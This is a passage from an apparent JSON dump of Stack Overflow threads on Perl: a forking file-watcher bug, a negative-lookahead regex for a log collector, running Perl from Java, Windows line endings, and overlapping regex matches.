one\n#sleep(2);\n#usleep(10_000); #$microseconds = 750_000;\nfor my $pid (@pids) {\n    waitpid($pid, 0)  #0 =&gt; block\n}\n}\n</code></pre>\n\n<p>file creation</p>\n\n<p>=============================</p>\n\n<pre><code>touch 1.log  \ntouch 2.log  \ntouch 3.log  \ntouch 4.log  \n</code></pre>\n\n<p>output of the script</p>\n\n<p>=========================</p>\n\n<pre><code>/home/goudarsh/Desktop/logs/1.log was created  \n/home/goudarsh/Desktop/logs/2.log was created  \n/home/goudarsh/Desktop/logs/2.log was created  \n/home/goudarsh/Desktop/logs/3.log was created  \n/home/goudarsh/Desktop/logs/3.log was created  \n/home/goudarsh/Desktop/logs/3.log was created  \n/home/goudarsh/Desktop/logs/4.log was created  \n/home/goudarsh/Desktop/logs/3.log was created  \n/home/goudarsh/Desktop/logs/4.log was created  \n/home/goudarsh/Desktop/logs/4.log was created  \n/home/goudarsh/Desktop/logs/4.log was created  \n/home/goudarsh/Desktop/logs/4.log was created  \n/home/goudarsh/Desktop/logs/4.log was created  \n/home/goudarsh/Desktop/logs/4.log was created  \n/home/goudarsh/Desktop/logs/4.log was created      \n</code></pre>\n\n<p>Where as i am expecting one notification/alert printed for one file on the terminal.\nwhat i suspect is that there is some bug in the \"Forking part\" section!</p>\n\n<p>any idea where's i am doing wrong ?</p>\n"}, {"tags": ["xml", "perl", "unix"], "comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1454926419, "post_id": 35264673, "comment_id": 58245443, "body": "Which log collector? This is important - XML handling is different from plain text handling."}], "answers": [{"comments": [{"owner": {"reputation": 55, "user_id": 3269606, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/xwcCn.png?s=128&g=1", "display_name": "user3269606", "link": "https://stackoverflow.com/users/3269606/user3269606"}, "edited": false, "score": 0, "creation_date": 1454921477, "post_id": 35265001, "comment_id": 58242522, "body": "the log collector uses perl reg expression."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1454926448, "post_id": 35265001, "comment_id": 58245459, "body": "I would hope it doesn&#39;t, as you&#39;re reading <code>XML</code>, and regular expression processing of XML is nasty."}, {"owner": {"reputation": 55, "user_id": 3269606, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/xwcCn.png?s=128&g=1", "display_name": "user3269606", "link": "https://stackoverflow.com/users/3269606/user3269606"}, "edited": false, "score": 0, "creation_date": 1454931848, "post_id": 35265001, "comment_id": 58248868, "body": "I tried with the changes, But the undo files still exist."}, {"owner": {"reputation": 55, "user_id": 3269606, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/xwcCn.png?s=128&g=1", "display_name": "user3269606", "link": "https://stackoverflow.com/users/3269606/user3269606"}, "edited": false, "score": 0, "creation_date": 1454932396, "post_id": 35265001, "comment_id": 58249185, "body": "The files beginning with undo, which is under path4 are getting matched and is being collected every time.   The files and dir&#39;s under path3 needs to be logged ."}, {"owner": {"reputation": 21654, "user_id": 107331, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/cf6d0868b2b4c69bac3e6f265a32b6a7?s=128&d=identicon&r=PG", "display_name": "Daniel Martin", "link": "https://stackoverflow.com/users/107331/daniel-martin"}, "reply_to_user": {"reputation": 55, "user_id": 3269606, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/xwcCn.png?s=128&g=1", "display_name": "user3269606", "link": "https://stackoverflow.com/users/3269606/user3269606"}, "edited": false, "score": 0, "creation_date": 1454942293, "post_id": 35265001, "comment_id": 58255926, "body": "@user3269606 That regular expression will not match files beginning with undo. Therefore, the log collector is not in fact matching files with that regular expression - is it maybe matching directories? (Since that expression will match <code>&#47;path1&#47;path2&#47;path3&#47;</code>) What if you change to <code>&#47;path1&#47;path2&#47;path3&#47;(?!undo)[^&#47;]+</code> ?"}, {"owner": {"reputation": 55, "user_id": 3269606, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/xwcCn.png?s=128&g=1", "display_name": "user3269606", "link": "https://stackoverflow.com/users/3269606/user3269606"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1455093400, "post_id": 35265001, "comment_id": 58329875, "body": "@ikegami undo is a file under path4 not a directory. Like undo_fil1.txt and undo_fil2.txt.    but i am collecting log from path3 which needs to exclude the undo files which are under path4. excluding the undo files i need to collect all files and folders which come under path3."}, {"owner": {"reputation": 55, "user_id": 3269606, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/xwcCn.png?s=128&g=1", "display_name": "user3269606", "link": "https://stackoverflow.com/users/3269606/user3269606"}, "edited": false, "score": 0, "creation_date": 1455094901, "post_id": 35265001, "comment_id": 58330771, "body": "@DanielMartin could you explain what the below expression does     /(?!undo)[^/]+  ?"}, {"owner": {"reputation": 21654, "user_id": 107331, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/cf6d0868b2b4c69bac3e6f265a32b6a7?s=128&d=identicon&r=PG", "display_name": "Daniel Martin", "link": "https://stackoverflow.com/users/107331/daniel-martin"}, "edited": false, "score": 0, "creation_date": 1455117394, "post_id": 35265001, "comment_id": 58346573, "body": "Updated answer to show what the expression matches. If you need to understand how it works, any guide to perl regular expressions covering negative lookahead would work. (for example, <a href=\"http://www.regular-expressions.info/lookaround.html\" rel=\"nofollow noreferrer\">regular-expressions.info/lookaround.html</a>)"}], "tags": [], "owner": {"reputation": 21654, "user_id": 107331, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/cf6d0868b2b4c69bac3e6f265a32b6a7?s=128&d=identicon&r=PG", "display_name": "Daniel Martin", "link": "https://stackoverflow.com/users/107331/daniel-martin"}, "is_accepted": false, "score": 0, "last_activity_date": 1455116749, "last_edit_date": 1455116749, "creation_date": 1454919423, "answer_id": 35265001, "question_id": 35264673, "link": "https://stackoverflow.com/questions/35264673/how-to-not-match-a-pattern-in-xml/35265001#35265001", "title": "how to not match a pattern in xml", "body": "<p>Assuming from the tags that this log collector takes a perl regular expression or something like it, then it'd be:</p>\n\n<pre><code>&lt;logs&gt;  \n    &lt;log path=\"/path1/path2/path3/(?!undo)[^/]*\"/&gt;  \n&lt;/logs&gt;\n</code></pre>\n\n<p>(Depending on whether the log collector needs the regular expression to match the whole file name, the <code>[^/]*</code> at the end may not be necessary)</p>\n\n<p>Unfortunately, the name \"log collector\" is a bit generic, so I don't actually know what software you mean, so I don't know if it in fact does take a perl regular expression; it would be helpful to give a reference to the actual software your using.</p>\n\n<hr>\n\n<p>Okay, here's what that that regular expression should match, using this perl test program:</p>\n\n<pre><code>my $re = qr{/path1/path2/path3/(?!undo)[^/]*};\n\nfor (&lt;&gt;) {\n  chomp;\n  if ($_ =~ $re) {\n    print \"$_ matches\\n\"\n  } else {\n    print \"$_ DOES NOT MATCH\\n\"\n  }\n}\n</code></pre>\n\n<p>That shows us:</p>\n\n<pre><code>/path1/path2/path3/foo.txt matches\n/path1/path2/path3/bar.log matches\n/path1/path2/path3/undo_5.txt DOES NOT MATCH\n/path1/path2/path3/ matches\n</code></pre>\n\n<p>This is why I really wanted a pointer to the software. Because you say that the revised regex does not work, that \"undo\" files are still getting pulled in, and that tells me that the log software does not match the full filename to the regular expression, but only the path (directory) name. We can see from the evidence above that the regular expression does not match files with names beginning with \"undo\".</p>\n\n<p>And since you want some files in the directory to be matched and some not, you should hope that your software has something like a separate <code>file=</code> attribute that accepts a regular expression for the file names.</p>\n"}], "owner": {"reputation": 55, "user_id": 3269606, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/xwcCn.png?s=128&g=1", "display_name": "user3269606", "link": "https://stackoverflow.com/users/3269606/user3269606"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 57, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1455116749, "creation_date": 1454917848, "last_edit_date": 1454917994, "question_id": 35264673, "link": "https://stackoverflow.com/questions/35264673/how-to-not-match-a-pattern-in-xml", "title": "how to not match a pattern in xml", "body": "<p>Log collector takes path to collect the log files. How to omit the \"undo\" files present in path4 directory.<br>\nCollect logs from path below but omit undo files from path4  </p>\n\n<pre><code>&lt;logs&gt;  \n    &lt;log path=\"/path1/path2/path3/^[undo]*\"/&gt;  \n&lt;/logs&gt;\n</code></pre>\n\n<p>/path1/path2/path3/path4/undo1.txt<br>\n/path1/path2/path3/path4/undo2.txt</p>\n"}, {"tags": ["javascript", "java", "perl", "selenium", "selenium-webdriver"], "comments": [{"owner": {"reputation": 13000, "user_id": 3190347, "user_type": "registered", "accept_rate": 68, "profile_image": "https://i.stack.imgur.com/Fsjd6.jpg?s=128&g=1", "display_name": "Shubham Jain", "link": "https://stackoverflow.com/users/3190347/shubham-jain"}, "edited": false, "score": 0, "creation_date": 1454910520, "post_id": 35263053, "comment_id": 58237944, "body": "do you want to run perl script using java code?"}, {"owner": {"reputation": 173, "user_id": 4412572, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/5775b60ef2c50e84217981c9b075671f?s=128&d=identicon&r=PG&f=1", "display_name": "Bhawani", "link": "https://stackoverflow.com/users/4412572/bhawani"}, "reply_to_user": {"reputation": 13000, "user_id": 3190347, "user_type": "registered", "accept_rate": 68, "profile_image": "https://i.stack.imgur.com/Fsjd6.jpg?s=128&g=1", "display_name": "Shubham Jain", "link": "https://stackoverflow.com/users/3190347/shubham-jain"}, "edited": false, "score": 0, "creation_date": 1454913780, "post_id": 35263053, "comment_id": 58239138, "body": "Yes Subham, I need to run perl script file to run inside the java code and pass parameter as csv file."}], "answers": [{"comments": [{"owner": {"reputation": 173, "user_id": 4412572, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/5775b60ef2c50e84217981c9b075671f?s=128&d=identicon&r=PG&f=1", "display_name": "Bhawani", "link": "https://stackoverflow.com/users/4412572/bhawani"}, "edited": false, "score": 0, "creation_date": 1455525063, "post_id": 35264660, "comment_id": 58510503, "body": "Hi Subham,I am using the command :                                               process = Runtime.getRuntime().exec(&quot;perl -w&quot;+ &quot;\\\\app-ci-test\\\\src\\\\test\\\\resources\\\\data\\\\ltplus.pl&quot;+&quot; -d 3 -x &quot;+ &quot;\\\\app-ci-test\\\\src\\\\test\\\\resources\\\\data\\\\xy.csv&quot; +&quot; -t 5 -s 1 -i 1 -r 600&quot;);   I am getting Error:                java.io.IOException: Cannot run program &quot;perl&quot;: CreateProcess error=2, The system cannot find the file specified"}, {"owner": {"reputation": 13000, "user_id": 3190347, "user_type": "registered", "accept_rate": 68, "profile_image": "https://i.stack.imgur.com/Fsjd6.jpg?s=128&g=1", "display_name": "Shubham Jain", "link": "https://stackoverflow.com/users/3190347/shubham-jain"}, "reply_to_user": {"reputation": 173, "user_id": 4412572, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/5775b60ef2c50e84217981c9b075671f?s=128&d=identicon&r=PG&f=1", "display_name": "Bhawani", "link": "https://stackoverflow.com/users/4412572/bhawani"}, "edited": false, "score": 0, "creation_date": 1455529095, "post_id": 35264660, "comment_id": 58512939, "body": "is perl is installed in your system.. is it present in your class path .. is perl running fine by executing from terminal(cmd)?"}, {"owner": {"reputation": 173, "user_id": 4412572, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/5775b60ef2c50e84217981c9b075671f?s=128&d=identicon&r=PG&f=1", "display_name": "Bhawani", "link": "https://stackoverflow.com/users/4412572/bhawani"}, "edited": false, "score": 0, "creation_date": 1455534354, "post_id": 35264660, "comment_id": 58516450, "body": "Thanks Shubham. I installed Perl and Set the path in Env variable. But still it shows the same error: java.io.IOException: Cannot run program &quot;perl&quot;: CreateProcess error=2, The system cannot find the file specified"}], "tags": [], "owner": {"reputation": 13000, "user_id": 3190347, "user_type": "registered", "accept_rate": 68, "profile_image": "https://i.stack.imgur.com/Fsjd6.jpg?s=128&g=1", "display_name": "Shubham Jain", "link": "https://stackoverflow.com/users/3190347/shubham-jain"}, "is_accepted": false, "score": 0, "last_activity_date": 1454928517, "last_edit_date": 1454928517, "creation_date": 1454917819, "answer_id": 35264660, "question_id": 35263053, "link": "https://stackoverflow.com/questions/35263053/selenium-webdriver-how-to-execute-perl-command-with-parameters-in-selenium-jav/35264660#35264660", "title": "Selenium Webdriver - How to execute Perl command with parameters in selenium-Java framework code", "body": "<p><code>Runtime.getRuntime().exec()</code> function will run your code through java code. Now you are asking for parameter passing. I understand this like there is some variables which you want to pass in this script.</p>\n\n<p>Yes, you can do that using + operator. As similer we concat a string in java using + operator. Similarly pass them. I am posting a sample code for same. Below code will execute your perl script. </p>\n\n<p>Use below code:-</p>\n\n<pre><code>    String myvariable = \"data\";\n    Process process;\n\n       try {\n        process = Runtime.getRuntime().exec(\"perl C:\\\\Users\\\\Shubham\\\\Desktop\\\\\"+myvariable+\"\\\\ROUGE-1.5.5.pl\");\n        process.waitFor();\n        if (process.exitValue() == 0) {\n         System.out.println(\"Command Successful\");\n        } else {\n         System.out.println(\"Command Failure\");\n        }\n       } catch (Exception e) {\n        System.out.println(\"Exception: \" + e.toString());\n       }\n      }\n    }\n</code></pre>\n\n<p>Hope it will help you :)</p>\n"}], "owner": {"reputation": 173, "user_id": 4412572, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/5775b60ef2c50e84217981c9b075671f?s=128&d=identicon&r=PG&f=1", "display_name": "Bhawani", "link": "https://stackoverflow.com/users/4412572/bhawani"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 409, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1455086304, "creation_date": 1454910255, "last_edit_date": 1455086304, "question_id": 35263053, "link": "https://stackoverflow.com/questions/35263053/selenium-webdriver-how-to-execute-perl-command-with-parameters-in-selenium-jav", "title": "Selenium Webdriver - How to execute Perl command with parameters in selenium-Java framework code", "body": "<p>I am working on <strong>Selenium</strong> framework with java scripting. I need to use series of Perl commands to execute to inject data into the system before validating the Selenium java scripts.</p>\n\n<p>How to execute Perl scripts inside the Selenium java code ?</p>\n"}, {"tags": ["windows", "perl", "newline"], "answers": [{"comments": [{"owner": {"reputation": 20550, "user_id": 327528, "user_type": "registered", "accept_rate": 37, "profile_image": "https://www.gravatar.com/avatar/dfea36f0a3ab8c5f8ad73bcc6cea241a?s=128&d=identicon&r=PG", "display_name": "CJ7", "link": "https://stackoverflow.com/users/327528/cj7"}, "edited": false, "score": 0, "creation_date": 1454908982, "post_id": 35262261, "comment_id": 58237462, "body": "Will the <code>\\r</code> have any effect in Unix?"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "reply_to_user": {"reputation": 20550, "user_id": 327528, "user_type": "registered", "accept_rate": 37, "profile_image": "https://www.gravatar.com/avatar/dfea36f0a3ab8c5f8ad73bcc6cea241a?s=128&d=identicon&r=PG", "display_name": "CJ7", "link": "https://stackoverflow.com/users/327528/cj7"}, "edited": false, "score": 0, "creation_date": 1454910880, "post_id": 35262261, "comment_id": 58238055, "body": "@CJ7 Yes, it will. What exactly are you trying to do?"}, {"owner": {"reputation": 20550, "user_id": 327528, "user_type": "registered", "accept_rate": 37, "profile_image": "https://www.gravatar.com/avatar/dfea36f0a3ab8c5f8ad73bcc6cea241a?s=128&d=identicon&r=PG", "display_name": "CJ7", "link": "https://stackoverflow.com/users/327528/cj7"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1454970132, "post_id": 35262261, "comment_id": 58272486, "body": "@ThisSuitIsBlackNot When I ran the above code in Unix it had the same result as doing <code>print OUT &quot;Hello\\nWorld&quot;;</code>"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "reply_to_user": {"reputation": 20550, "user_id": 327528, "user_type": "registered", "accept_rate": 37, "profile_image": "https://www.gravatar.com/avatar/dfea36f0a3ab8c5f8ad73bcc6cea241a?s=128&d=identicon&r=PG", "display_name": "CJ7", "link": "https://stackoverflow.com/users/327528/cj7"}, "edited": false, "score": 0, "creation_date": 1454971890, "post_id": 35262261, "comment_id": 58273240, "body": "@CJ7 It&#39;s not the same. For example, <code>echo -e &#39;#!&#47;bin&#47;sh\\r\\necho foo&#39; &gt; foo &amp;&amp; chmod 755 foo &amp;&amp; .&#47;foo</code> will give you <code>&#47;bin&#47;sh^M: bad interpreter: No such file or directory</code> (same if you write the file with perl). Now do <code>perl -pe&#39;s&#47;$&#47;bar&#47;&#39; foo</code>, adding &quot;bar&quot; to the end of each line of the same file; when printed, the first line is <code>barbin&#47;sh</code>, not <code>#!&#47;bin&#47;shbar</code> as you might expect."}], "tags": [], "owner": {"reputation": 173, "user_id": 2737341, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f5e05c8edf9bb4c7bcd132a394f45353?s=128&d=identicon&r=PG&f=1", "display_name": "kizeloo", "link": "https://stackoverflow.com/users/2737341/kizeloo"}, "is_accepted": false, "score": 1, "last_activity_date": 1454908076, "last_edit_date": 1454908076, "creation_date": 1454904987, "answer_id": 35262261, "question_id": 35262218, "link": "https://stackoverflow.com/questions/35262218/newlines-when-displayed-in-windows/35262261#35262261", "title": "newlines when displayed in Windows", "body": "<p>Windows uses carriage-return + linefeed:</p>\n\n<pre><code>print OUT \"Hello\\r\\nWorld\";\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 3, "last_activity_date": 1454913366, "creation_date": 1454913366, "answer_id": 35263663, "question_id": 35262218, "link": "https://stackoverflow.com/questions/35262218/newlines-when-displayed-in-windows/35263663#35263663", "title": "newlines when displayed in Windows", "body": "<p>Text file line endings are platform-specific. If you're creating a file intended for the Windows platform then you should use</p>\n\n<pre><code>open OUT, '&gt;:crlf', 'output.txt' or die $!;\n</code></pre>\n\n<p>Then you can just</p>\n\n<pre><code>print OUT \"Hello\\nworld!\\n\";\n</code></pre>\n\n<p>as normal</p>\n\n<p>The <code>:crlf</code> PerlIO layer is the default for Perl executables built for Windows, so you don't need to add it to code that will create files for its intended platform. For portable software you can check the host system by examining the built-in variable <code>$^O</code></p>\n"}, {"comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1454946866, "post_id": 35272576, "comment_id": 58259150, "body": "Cool module, although it might help to explain that programs that are unaware of line ending issues will only work with one or the other; based on their comment on kizeloo&#39;s answer, it sounds like the OP expects to be able to write a file that will be interpreted the same by all programs on both *nix and doze."}, {"owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 0, "creation_date": 1455477614, "post_id": 35272576, "comment_id": 58496530, "body": "While this is a useful module, it doesn&#39;t seem to be relevant to the OP&#39;s question as s/he is talking about <i>creating</i> a file for the first time on a *nix system intended to be viewed correctly on Windows using Notepad."}], "tags": [], "owner": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "is_accepted": false, "score": 0, "last_activity_date": 1454943371, "creation_date": 1454943371, "answer_id": 35272576, "question_id": 35262218, "link": "https://stackoverflow.com/questions/35262218/newlines-when-displayed-in-windows/35272576#35272576", "title": "newlines when displayed in Windows", "body": "<p>I wrote the <a href=\"https://metacpan.org/pod/File::Edit::Portable\" rel=\"nofollow\">File::Edit::Portable</a> module that eliminates these problems. Although you can use it to write (along with many other things), you only need the <code>read()</code> functionality in this case.</p>\n\n<p>Install the module, and at the top of your script, add:</p>\n\n<pre><code>use File::Edit::Portable;\n</code></pre>\n\n<p>When opening/reading the file, you can just do:</p>\n\n<pre><code>my $rw = File::Edit::Portable-&gt;new;\n\nmy $fh = $rw-&gt;read('file.txt');\n</code></pre>\n\n<p>No matter what the line endings are or what platform you're on, it does all of the cross-platform work in the background so you don't have to. That way, you can open the file on any system, regardless of what line endings you've decided to use, and it just works.</p>\n"}, {"tags": [], "owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "is_accepted": false, "score": 0, "last_activity_date": 1455477522, "last_edit_date": 1495542199, "creation_date": 1455477522, "answer_id": 35396982, "question_id": 35262218, "link": "https://stackoverflow.com/questions/35262218/newlines-when-displayed-in-windows/35396982#35396982", "title": "newlines when displayed in Windows", "body": "<p>Newline handling is <em>editor</em> specific (there are a number of answers that claim it is OS specific, but that is, in real life, not true in general). However, it is true that on DOSish systems, longstanding convention is to use CRLF to indicate <a href=\"https://en.wikipedia.org/wiki/Newline\" rel=\"nofollow noreferrer\">EOL</a> (see also <a href=\"https://stackoverflow.com/questions/1586421/why-is-fwrite-writing-more-than-i-tell-it-to/1586426#1586426\">Why is fwrite writing more than I tell it to?</a>)</p>\n\n<p>If you try to open this file in any other editor than Notepad, you will notice that the text is properly displayed on two lines, with an indicator in a status bar or some other place that the file is opened in Unix mode or LF mode.</p>\n\n<p>Unless you intend your file solely for viewing with Notepad, you don't have anything to worry about. Every other tool on Windows will deal fine with it.</p>\n\n<p>However, Notepad does expect a CRLF sequence to mark the end of each line. If you do want to cater for it, then you can just output <code>\"\\r\\n\"</code> as @kizeloo suggests. I do prefer to use <a href=\"https://stackoverflow.com/a/35263663/100754\">output layers</a> when they are necessary.</p>\n\n<p>Note that if you try to view such a file using an editor that requires a single LF to signify EOL, you may see <code>^M</code>s or other characters denoting the CR.</p>\n"}], "owner": {"reputation": 20550, "user_id": 327528, "user_type": "registered", "accept_rate": 37, "profile_image": "https://www.gravatar.com/avatar/dfea36f0a3ab8c5f8ad73bcc6cea241a?s=128&d=identicon&r=PG", "display_name": "CJ7", "link": "https://stackoverflow.com/users/327528/cj7"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 88, "favorite_count": 0, "answer_count": 4, "score": 0, "last_activity_date": 1455477522, "creation_date": 1454904537, "question_id": 35262218, "link": "https://stackoverflow.com/questions/35262218/newlines-when-displayed-in-windows", "title": "newlines when displayed in Windows", "body": "<pre><code>open OUT, \"&gt;output.txt\";\nprint OUT \"Hello\\nWorld\";\n</code></pre>\n\n<p>When I run the above perl code in a Unix system and then transfer <code>output.txt</code> to Windows and open it in Notepad it shows as:</p>\n\n<blockquote>\n  <p>HelloWorld</p>\n</blockquote>\n\n<p>What do I need to do to get the newlines displaying properly in Windows?</p>\n"}, {"tags": ["regex", "matlab", "perl", "sliding-window"], "answers": [{"comments": [{"owner": {"reputation": 41, "user_id": 3808384, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c2669a93d8d9163621bd95940be8ba03?s=128&d=identicon&r=PG", "display_name": "Xianrui Cheng", "link": "https://stackoverflow.com/users/3808384/xianrui-cheng"}, "edited": false, "score": 0, "creation_date": 1455054793, "post_id": 35263521, "comment_id": 58316166, "body": "It is a good solution, but my reputation is too low on the site that I can&#39;t up vote it...sorry"}], "tags": [], "owner": {"reputation": 4807, "user_id": 1893154, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/KvEaT.jpg?s=128&g=1", "display_name": "zeeMonkeez", "link": "https://stackoverflow.com/users/1893154/zeemonkeez"}, "is_accepted": false, "score": 0, "last_activity_date": 1454912933, "last_edit_date": 1454912933, "creation_date": 1454912618, "answer_id": 35263521, "question_id": 35261743, "link": "https://stackoverflow.com/questions/35261743/sliding-window-pattern-match-in-perl-or-matlab-regular-expressions/35263521#35263521", "title": "Sliding window pattern match in perl or matlab regular expressions", "body": "<p>Once the <code>regexp</code> algorithm has found a match, the matched characters are not considered for further matches (and usually, this is what one wants, e.g. <code>.*</code> is <em>not</em> supposed to match every conceivable contiguous substring of this post). A workaround would be to start the search again one character after the first match, and collect the results:</p>\n\n<pre><code>str = 't10_t20_t30_t40_';\nsub_str = str;\nreg_ex = 't(\\d+)_t(\\d+)';\nstart_idx = 0;\nall_start_indeces = [];\nall_end_indeces = [];\noff_set = 0;\n%// While there are matches later in the string and the first match of the\n%// remaining string is not the last character\nwhile ~isempty(start_idx) &amp;&amp; (start_idx &lt; numel(str))\n    %// Calculate offset to original string\n    off_set = off_set + start_idx;\n    %// extract string starting at first character after first match\n    sub_str = sub_str((start_idx + 1):end);\n    %// find further matches\n    [start_idx, end_idx] = regexp(sub_str, reg_ex, 'once');\n    %// save match if any\n    if ~isempty(start_idx)\n        all_start_indeces = [all_start_indeces, start_idx + off_set];\n        all_end_indeces = [all_end_indeces, end_idx + off_set];\n    end\nend\ndisplay(all_start_indeces)\ndisplay(all_end_indeces)\nmatched_strings = arrayfun(@(st, en) str(st:en), all_start_indeces, all_end_indeces, 'uniformoutput', 0)\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 82895, "user_id": 372239, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/2twLb.jpg?s=128&g=1", "display_name": "Toto", "link": "https://stackoverflow.com/users/372239/toto"}, "is_accepted": false, "score": 3, "last_activity_date": 1454939009, "creation_date": 1454939009, "answer_id": 35271140, "question_id": 35261743, "link": "https://stackoverflow.com/questions/35261743/sliding-window-pattern-match-in-perl-or-matlab-regular-expressions/35271140#35271140", "title": "Sliding window pattern match in perl or matlab regular expressions", "body": "<p>Using Perl:</p>\n\n<pre><code>#!/usr/bin/perl\nuse Data::Dumper;\nuse Modern::Perl;\n\nmy $re = qr/(?=(t\\d+_t\\d+))/;\n\nmy @l = 't10_t20_t30_t40' =~  /$re/g;\nsay Dumper(\\@l);\n</code></pre>\n\n<p><strong>Output:</strong></p>\n\n<pre><code>$VAR1 = [\n          't10_t20',\n          't20_t30',\n          't30_t40'\n        ];\n</code></pre>\n"}], "owner": {"reputation": 41, "user_id": 3808384, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c2669a93d8d9163621bd95940be8ba03?s=128&d=identicon&r=PG", "display_name": "Xianrui Cheng", "link": "https://stackoverflow.com/users/3808384/xianrui-cheng"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 426, "favorite_count": 0, "answer_count": 2, "score": 4, "last_activity_date": 1455054700, "creation_date": 1454900007, "last_edit_date": 1455054700, "question_id": 35261743, "link": "https://stackoverflow.com/questions/35261743/sliding-window-pattern-match-in-perl-or-matlab-regular-expressions", "title": "Sliding window pattern match in perl or matlab regular expressions", "body": "<p>I am trying to use either Perl or MATLAB to parse a few numbers out of a single line of text.  My text line is:</p>\n\n<p>t10_t20_t30_t40_</p>\n\n<p>now in matlab, i used the following script </p>\n\n<pre><code>str = 't10_t20_t30_t40_';\na = regexp(str,'t(\\d+)_t(\\d+)','match')\n</code></pre>\n\n<p>and it returns</p>\n\n<pre><code>a = \n\n't10_t20'    't30_t40'\n</code></pre>\n\n<p>What I want is for it to also return 't20_t30', since this obviously is a match.  Why doesn't regexp scan it?  </p>\n\n<p>I thus turned to Perl, and wrote the following in Perl:</p>\n\n<pre><code>#!/usr/bin/perl -w\n$str = \"t10_t20_t30_t40_\";\nwhile($str =~ /(t\\d+_t\\d+)/g)\n{\n    print \"$1\\n\";\n}\n</code></pre>\n\n<p>and the result is the same as matlab</p>\n\n<pre><code>t10_t20\nt30_t40\n</code></pre>\n\n<p>but I really wanted \"t20_t30\" also be in the results.  </p>\n\n<p>Can anyone tell me how to accomplish that?  